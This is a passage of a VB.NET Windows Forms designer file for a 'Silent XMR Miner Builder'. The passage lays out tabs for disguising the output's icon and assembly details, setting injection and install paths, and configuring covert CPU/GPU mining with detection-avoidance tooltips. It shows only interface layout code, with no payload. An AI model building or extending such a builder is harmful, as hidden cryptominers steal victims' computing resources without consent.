        Me.TabPage4.Text = "Icon"
        '
        'chkIcon
        '
        Me.chkIcon.AccentColor = System.Drawing.Color.Maroon
        Me.chkIcon.BackColor = System.Drawing.Color.Transparent
        Me.chkIcon.Checked = False
        Me.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkIcon.ForeColor = System.Drawing.Color.Black
        Me.chkIcon.Location = New System.Drawing.Point(14, 12)
        Me.chkIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.chkIcon.Name = "chkIcon"
        Me.chkIcon.Size = New System.Drawing.Size(111, 24)
        Me.chkIcon.TabIndex = 21
        Me.chkIcon.Text = "Disabled"
        '
        'picIcon
        '
        Me.picIcon.ErrorImage = Nothing
        Me.picIcon.Image = CType(resources.GetObject("picIcon.Image"), System.Drawing.Image)
        Me.picIcon.InitialImage = Nothing
        Me.picIcon.Location = New System.Drawing.Point(160, 81)
        Me.picIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.picIcon.Name = "picIcon"
        Me.picIcon.Size = New System.Drawing.Size(96, 96)
        Me.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picIcon.TabIndex = 11
        Me.picIcon.TabStop = False
        '
        'btnBrowseIcon
        '
        Me.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent
        Me.btnBrowseIcon.Enabled = False
        Me.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btnBrowseIcon.Location = New System.Drawing.Point(14, 48)
        Me.btnBrowseIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.btnBrowseIcon.Name = "btnBrowseIcon"
        Me.btnBrowseIcon.Size = New System.Drawing.Size(69, 25)
        Me.btnBrowseIcon.TabIndex = 9
        Me.btnBrowseIcon.Text = "Browse"
        '
        'txtIconPath
        '
        Me.txtIconPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtIconPath.ForeColor = System.Drawing.Color.Silver
        Me.txtIconPath.Location = New System.Drawing.Point(87, 49)
        Me.txtIconPath.Margin = New System.Windows.Forms.Padding(2)
        Me.txtIconPath.MaxLength = 32767
        Me.txtIconPath.MultiLine = False
        Me.txtIconPath.Name = "txtIconPath"
        Me.txtIconPath.Size = New System.Drawing.Size(302, 24)
        Me.txtIconPath.TabIndex = 10
        Me.txtIconPath.Text = "Path to icon..."
        Me.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtIconPath.UseSystemPasswordChar = False
        Me.txtIconPath.WordWrap = False
        '
        'TabPage6
        '
        Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage6.Controls.Add(Me.Label13)
        Me.TabPage6.Controls.Add(Me.toggleEnableCPU)
        Me.TabPage6.Controls.Add(Me.Label12)
        Me.TabPage6.Controls.Add(Me.toggleEnableNicehash)
        Me.TabPage6.Controls.Add(Me.Label11)
        Me.TabPage6.Controls.Add(Me.toggleEnableIdle)
        Me.TabPage6.Controls.Add(Me.Label4)
        Me.TabPage6.Controls.Add(Me.toggleEnableGPU)
        Me.TabPage6.Controls.Add(Me.txtMaxCPU)
        Me.TabPage6.Controls.Add(Me.Label3)
        Me.TabPage6.Location = New System.Drawing.Point(89, 4)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.Size = New System.Drawing.Size(418, 189)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "Mining"
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(16, 50)
        Me.Label13.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(79, 17)
        Me.Label13.TabIndex = 34
        Me.Label13.Text = "CPU Mining:"
        Me.TooltipHelper.SetToolTip(Me.Label13, "GPU Mining gives better performance but is easier to detect and increases the min" &
        "er file size.")
        '
        'toggleEnableCPU
        '
        Me.toggleEnableCPU.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableCPU.Checked = True
        Me.toggleEnableCPU.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableCPU.Location = New System.Drawing.Point(98, 48)
        Me.toggleEnableCPU.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableCPU.Name = "toggleEnableCPU"
        Me.toggleEnableCPU.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableCPU.TabIndex = 33
        Me.toggleEnableCPU.Text = "Enable CPU Mining"
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Location = New System.Drawing.Point(16, 147)
        Me.Label12.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(108, 17)
        Me.Label12.TabIndex = 32
        Me.Label12.Text = "Nicehash Mining:"
        Me.TooltipHelper.SetToolTip(Me.Label12, "Only enable if mining to nicehash.com.")
        '
        'toggleEnableNicehash
        '
        Me.toggleEnableNicehash.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableNicehash.Checked = False
        Me.toggleEnableNicehash.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableNicehash.Location = New System.Drawing.Point(127, 144)
        Me.toggleEnableNicehash.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableNicehash.Name = "toggleEnableNicehash"
        Me.toggleEnableNicehash.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableNicehash.TabIndex = 31
        Me.toggleEnableNicehash.Text = "Enable Nicehash Mining"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(16, 114)
        Me.Label11.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(76, 17)
        Me.Label11.TabIndex = 30
        Me.Label11.Text = "Idle Mining:"
        Me.TooltipHelper.SetToolTip(Me.Label11, "If enabled the miner will pause when the computer is in use and only resume when " &
        "no input has been detected for 15 minutes.")
        '
        'toggleEnableIdle
        '
        Me.toggleEnableIdle.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableIdle.Checked = True
        Me.toggleEnableIdle.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableIdle.Location = New System.Drawing.Point(98, 112)
        Me.toggleEnableIdle.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableIdle.Name = "toggleEnableIdle"
        Me.toggleEnableIdle.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableIdle.TabIndex = 29
        Me.toggleEnableIdle.Text = "Enable Idle Mining"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(16, 82)
        Me.Label4.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(80, 17)
        Me.Label4.TabIndex = 28
        Me.Label4.Text = "GPU Mining:"
        Me.TooltipHelper.SetToolTip(Me.Label4, "GPU Mining gives better performance but is easier to detect and increases the min" &
        "er file size.")
        '
        'toggleEnableGPU
        '
        Me.toggleEnableGPU.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableGPU.Checked = True
        Me.toggleEnableGPU.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableGPU.Location = New System.Drawing.Point(98, 80)
        Me.toggleEnableGPU.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableGPU.Name = "toggleEnableGPU"
        Me.toggleEnableGPU.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableGPU.TabIndex = 27
        Me.toggleEnableGPU.Text = "Enable GPU Mining"
        '
        'txtMaxCPU
        '
        Me.txtMaxCPU.BackColor = System.Drawing.Color.Transparent
        Me.txtMaxCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtMaxCPU.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtMaxCPU.ForeColor = System.Drawing.Color.Silver
        Me.txtMaxCPU.FormattingEnabled = True
        Me.txtMaxCPU.ItemHeight = 16
        Me.txtMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtMaxCPU.Items.AddRange(New Object() {"10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
        Me.txtMaxCPU.Location = New System.Drawing.Point(82, 14)
        Me.txtMaxCPU.Name = "txtMaxCPU"
        Me.txtMaxCPU.Size = New System.Drawing.Size(60, 22)
        Me.txtMaxCPU.StartIndex = 0
        Me.txtMaxCPU.TabIndex = 26
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(16, 16)
        Me.Label3.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(64, 17)
        Me.Label3.TabIndex = 25
        Me.Label3.Text = "Max CPU:"
        Me.TooltipHelper.SetToolTip(Me.Label3, "The max amount of CPU to use.")
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.labelHackforums)
        Me.TabPage5.Controls.Add(Me.labelGitHub)
        Me.TabPage5.Controls.Add(Me.txtLog)
        Me.TabPage5.Controls.Add(Me.btnBuild)
        Me.TabPage5.Location = New System.Drawing.Point(89, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(418, 189)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Build"
        '
        'labelHackforums
        '
        Me.labelHackforums.AutoSize = True
        Me.labelHackforums.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.labelHackforums.Location = New System.Drawing.Point(57, 167)
        Me.labelHackforums.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.labelHackforums.Name = "labelHackforums"
        Me.labelHackforums.Size = New System.Drawing.Size(77, 17)
        Me.labelHackforums.TabIndex = 22
        Me.labelHackforums.TabStop = True
        Me.labelHackforums.Text = "Hackforums"
        '
        'labelGitHub
        '
        Me.labelGitHub.AutoSize = True
        Me.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.labelGitHub.Location = New System.Drawing.Point(8, 167)
        Me.labelGitHub.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.labelGitHub.Name = "labelGitHub"
        Me.labelGitHub.Size = New System.Drawing.Size(48, 17)
        Me.labelGitHub.TabIndex = 21
        Me.labelGitHub.TabStop = True
        Me.labelGitHub.Text = "GitHub"
        '
        'txtLog
        '
        Me.txtLog.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtLog.Font = New System.Drawing.Font("Segoe UI", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtLog.ForeColor = System.Drawing.Color.Silver
        Me.txtLog.Location = New System.Drawing.Point(10, 41)
        Me.txtLog.Margin = New System.Windows.Forms.Padding(2)
        Me.txtLog.MaxLength = 32767
        Me.txtLog.MultiLine = True
        Me.txtLog.Name = "txtLog"
        Me.txtLog.Size = New System.Drawing.Size(399, 119)
        Me.txtLog.TabIndex = 18
        Me.txtLog.Text = "Output..."
        Me.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtLog.UseSystemPasswordChar = False
        Me.txtLog.WordWrap = False
        '
        'btnBuild
        '
        Me.btnBuild.BackColor = System.Drawing.Color.Transparent
        Me.btnBuild.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btnBuild.Location = New System.Drawing.Point(309, 9)
        Me.btnBuild.Margin = New System.Windows.Forms.Padding(2)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.Size = New System.Drawing.Size(99, 25)
        Me.btnBuild.TabIndex = 17
        Me.btnBuild.Text = "Build"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(535, 272)
        Me.Controls.Add(Me.MephForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Margin = New System.Windows.Forms.Padding(2)
        Me.MaximumSize = New System.Drawing.Size(535, 272)
        Me.MinimumSize = New System.Drawing.Size(535, 272)
        Me.Name = "Form1"
        Me.Opacity = 0.95R
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Silent XMR Miner Builder"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.MephForm1.ResumeLayout(False)
        Me.MephTabcontrol2.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents MephForm1 As MephTheme
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents btn_assemblyRandom As MephButton
    Friend WithEvents btn_assemblyClone As MephButton
    Friend WithEvents num_Assembly4 As MephTextBox
    Friend WithEvents num_Assembly3 As MephTextBox
    Friend WithEvents num_Assembly2 As MephTextBox
    Friend WithEvents num_Assembly1 As MephTextBox
    Friend WithEvents txtTrademark As MephTextBox
    Friend WithEvents txtCompany As MephTextBox
    Friend WithEvents txtCopyright As MephTextBox
    Friend WithEvents txtDescription As MephTextBox
    Friend WithEvents txtProduct As MephTextBox
    Friend WithEvents txtTitle As MephTextBox
    Friend WithEvents txtIconPath As MephTextBox
    Friend WithEvents btnBrowseIcon As MephButton
    Friend WithEvents txtInstallFileName As MephTextBox
    Friend WithEvents Label1 As Label
    Friend WithEvents picIcon As PictureBox
    Friend WithEvents Label2 As Label
    Friend WithEvents txtInstallPathMain As MephComboBox
    Friend WithEvents chkAssembly As MephCheckBox
    Friend WithEvents chkIcon As MephCheckBox
    Friend WithEvents Label8 As Label
    Friend WithEvents txtPoolURL As MephTextBox
    Friend WithEvents Label7 As Label
    Friend WithEvents txtPoolPassowrd As MephTextBox
    Friend WithEvents Label6 As Label
    Friend WithEvents txtPoolUsername As MephTextBox
    Friend WithEvents chkInstall As MephCheckBox
    Friend WithEvents MephTabcontrol2 As MephTabcontrol
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents TabPage5 As TabPage
    Friend WithEvents txtLog As MephTextBox
    Friend WithEvents btnBuild As MephButton
    Friend WithEvents Label10 As Label
    Friend WithEvents Label9 As Label
    Friend WithEvents Label5 As Label
    Friend WithEvents txtInjection As MephComboBox
    Friend WithEvents labelHackforums As LinkLabel
    Friend WithEvents labelGitHub As LinkLabel
    Friend WithEvents TabPage6 As TabPage
    Friend WithEvents Label4 As Label
    Friend WithEvents toggleEnableGPU As MephToggleSwitch
    Friend WithEvents txtMaxCPU As MephComboBox
    Friend WithEvents Label3 As Label
    Friend WithEvents Label11 As Label
    Friend WithEvents toggleEnableIdle As MephToggleSwitch
    Friend WithEvents Label12 As Label
    Friend WithEvents toggleEnableNicehash As MephToggleSwitch
    Friend WithEvents TooltipHelper As ToolTip
    Friend WithEvents Label13 As Label
    Friend WithEvents toggleEnableCPU As MephToggleSwitch
End Class
